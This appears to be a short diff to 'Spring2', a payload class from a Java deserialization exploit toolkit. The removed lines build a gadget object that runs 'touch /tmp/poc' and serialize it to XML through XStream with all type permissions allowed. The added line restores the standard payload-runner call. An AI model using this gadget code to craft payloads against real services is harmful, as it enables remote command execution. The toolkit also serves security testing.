@@ -71,21 +71,7 @@ public class Spring2 extends PayloadRunner implements ObjectPayload<Object> {
     }
 
     public static void main ( final String[] args ) throws Exception {
-
-
-		Spring2 c = new Spring2();
-		Object obj = c.getObject("touch /tmp/poc");
-		
-		XStream xStream = new XStream(new JettisonMappedXmlDriver());
-		xStream.setClassLoader(Thread.currentThread().getContextClassLoader());
-		xStream.addPermission(AnyTypePermission.ANY);
-
-
-
-		String xml = xStream.toXML(obj);                
-		System.out.println(xml);
-
-        // sPayloadRunner.run(Spring2.class, args);
+        PayloadRunner.run(Spring2.class, args);
     }
 
     public static boolean isApplicableJavaVersion() {
